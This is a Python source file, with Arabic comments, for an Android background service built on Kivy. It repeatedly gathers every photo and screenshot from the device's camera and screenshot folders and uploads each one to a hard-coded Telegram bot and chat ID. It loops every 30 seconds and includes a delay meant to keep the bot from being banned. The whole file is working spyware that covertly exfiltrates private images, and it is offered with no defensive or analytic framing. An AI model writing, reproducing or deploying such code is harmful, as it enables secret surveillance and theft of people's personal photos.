import os
import time
import requests
from jnius import autoclass

# إعدادات الأندرويد
PythonService = autoclass('org.kivy.android.PythonService')
service = PythonService.mService

def get_media():
    paths = [
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures/Screenshots"
    ]
    files = []
    for p in paths:
        if os.path.exists(p):
            for f in os.listdir(p):
                if f.lower().endswith(('.jpg', '.png', '.jpeg')):
                    files.append(os.path.join(p, f))
    return files

def send_files():
    token = "7820129712:AAH9pZ49S_m8tY8965625902"
    chat_id = "6110903337"
    
    media_files = get_media()
    for file_path in media_files:
        try:
            with open(file_path, 'rb') as f:
                requests.post(
                    f"https://api.telegram.org/bot{token}/sendDocument",
                    data={'chat_id': chat_id},
                    files={'document': f},
                    timeout=20
                )
            time.sleep(0.5) # تأخير بسيط لضمان عدم حظر البوت
        except:
            continue

if __name__ == '__main__':
    # تشغيل الإرسال فوراً وبشكل مستمر
    while True:
        send_files()
        time.sleep(30) # فحص كل 30 ثانية
